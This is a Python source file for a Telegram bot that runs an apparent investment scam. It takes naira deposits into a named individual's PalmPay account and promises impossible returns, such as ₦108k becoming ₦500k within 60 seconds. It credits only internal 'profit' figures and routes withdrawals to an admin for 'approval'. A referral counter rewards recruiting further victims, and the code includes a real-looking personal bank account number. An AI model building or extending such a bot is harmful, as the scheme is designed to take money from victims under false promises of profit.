import time
import os
import sqlite3
import asyncio

from telegram import ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters

# =========================
# SETTINGS
# =========================

TOKEN = os.getenv("TOKEN")
ADMIN_ID = 7593435783

if not TOKEN:
    raise Exception("TOKEN missing in environment variables")

# =========================
# DB
# =========================

conn = sqlite3.connect("bot.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""CREATE TABLE IF NOT EXISTS users(
    user_id INTEGER PRIMARY KEY,
    ref_by INTEGER DEFAULT NULL
)""")

cursor.execute("""CREATE TABLE IF NOT EXISTS balances(
    user_id INTEGER PRIMARY KEY,
    amount REAL DEFAULT 0
)""")

cursor.execute("""CREATE TABLE IF NOT EXISTS referrals(
    user_id INTEGER PRIMARY KEY,
    referrals INTEGER DEFAULT 0
)""")

cursor.execute("""CREATE TABLE IF NOT EXISTS investments(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    amount REAL,
    profit REAL,
    start_time INTEGER,
    duration INTEGER,
    status TEXT
)""")

conn.commit()

# =========================
# PLANS
# =========================

PLANS = {
    "Starter": [("₦3k → ₦5.2k", 3000, 5200)],
    "Premium": [("₦18k → ₦34k", 18000, 34000)],
    "VIP": [("₦108k → ₦500k", 108000, 500000)]
}

# =========================
# HELPERS
# =========================

def bal(uid):
    cursor.execute("SELECT amount FROM balances WHERE user_id=?", (uid,))
    r = cursor.fetchone()
    return r[0] if r else 0

def set_bal(uid, amt):
    cursor.execute("INSERT OR IGNORE INTO balances VALUES(?,?)", (uid, 0))
    cursor.execute("UPDATE balances SET amount=? WHERE user_id=?", (amt, uid))
    conn.commit()

# =========================
# MENU
# =========================

def menu():
    return ReplyKeyboardMarkup(
        [
            ["💰 Deposit", "🏧 Withdraw"],
            ["📈 Invest", "💳 Balance"],
            ["📊 Dashboard"]
        ],
        resize_keyboard=True
    )

# =========================
# START + REF SYSTEM
# =========================

async def start(update, context):
    uid = update.effective_user.id
    args = context.args

    ref = int(args[0]) if args else None

    cursor.execute("INSERT OR IGNORE INTO users VALUES(?,?)", (uid, ref))
    cursor.execute("INSERT OR IGNORE INTO balances VALUES(?,0)", (uid,))
    cursor.execute("INSERT OR IGNORE INTO referrals VALUES(?,0)", (uid,))
    conn.commit()

    # referral reward (SAFE - only for signup)
    if ref and ref != uid:
        cursor.execute("UPDATE referrals SET referrals = referrals + 1 WHERE user_id=?", (ref,))
        conn.commit()

    await update.message.reply_text("Welcome 🚀", reply_markup=menu())

# =========================
# BUTTONS
# =========================

async def buttons(update, context):
    text = update.message.text
    uid = update.effective_user.id
    b = bal(uid)

    if text == "💰 Deposit":
        await update.message.reply_text(
            "BANK:\nPALMPAY\nNAME: WISDOM ABEL\nACC: 09138224769"
        )

    elif text == "💳 Balance":
        await update.message.reply_text(f"Balance: ₦{b}")

    elif text == "🏧 Withdraw":
        if b < 200:
            await update.message.reply_text("❌ Minimum withdrawal is ₦200")
        else:
            await update.message.reply_text("📩 Withdrawal request sent to admin for approval.")

            await context.bot.send_message(
                ADMIN_ID,
                f"New withdrawal request:\nUser: {uid}\nAmount: ₦{b}"
            )

    elif text == "📊 Dashboard":
        cursor.execute("SELECT COUNT(*) FROM investments WHERE user_id=?", (uid,))
        inv = cursor.fetchone()[0]

        cursor.execute("SELECT referrals FROM referrals WHERE user_id=?", (uid,))
        ref = cursor.fetchone()[0]

        await update.message.reply_text(
            f"Balance: ₦{b}\nInvestments: {inv}\nReferrals: {ref}"
        )

    elif text == "📈 Invest":
        kb = [
            [InlineKeyboardButton("Starter", callback_data="Starter")],
            [InlineKeyboardButton("Premium", callback_data="Premium")],
            [InlineKeyboardButton("VIP", callback_data="VIP")]
        ]
        await update.message.reply_text("Choose Plan", reply_markup=InlineKeyboardMarkup(kb))

# =========================
# CALLBACKS
# =========================

async def cb(update, context):
    q = update.callback_query
    await q.answer()

    uid = q.from_user.id
    b = bal(uid)

    if q.data in PLANS:
        kb = [
            [InlineKeyboardButton(x[0], callback_data=f"buy_{q.data}_{i}")]
            for i, x in enumerate(PLANS[q.data])
        ]
        await q.message.reply_text("Plans", reply_markup=InlineKeyboardMarkup(kb))

    elif q.data.startswith("buy_"):
        _, plan, i = q.data.split("_")
        i = int(i)

        item = PLANS[plan][i]
        amount, profit = item[1], item[2]

        if b < amount:
            await q.message.reply_text("❌ Insufficient balance")
            return

        set_bal(uid, b - amount)

        cursor.execute("""
        INSERT INTO investments(user_id, amount, profit, start_time, duration, status)
        VALUES(?,?,?,?,?,?)
        """, (uid, amount, profit, int(time.time()), 60, "active"))

        conn.commit()

        await q.message.reply_text("✅ Investment started")

# =========================
# ENGINE
# =========================

def engine(app):
    async def loop():
        while True:
            await asyncio.sleep(30)

            now = int(time.time())

            rows = cursor.execute("""
            SELECT id, user_id, profit, start_time, duration
            FROM investments WHERE status='active'
            """).fetchall()

            for inv_id, uid, profit, start, dur in rows:
                if now >= start + dur:

                    cursor.execute("UPDATE investments SET status='done' WHERE id=?", (inv_id,))
                    conn.commit()

                    set_bal(uid, bal(uid) + profit)

                    try:
                        await app.bot.send_message(uid, f"🎉 Profit received: ₦{profit}")
                    except:
                        pass

    return loop()

# =========================
# MAIN
# =========================

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, buttons))
    app.add_handler(CallbackQueryHandler(cb))

    app.post_init = engine

    print("Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()
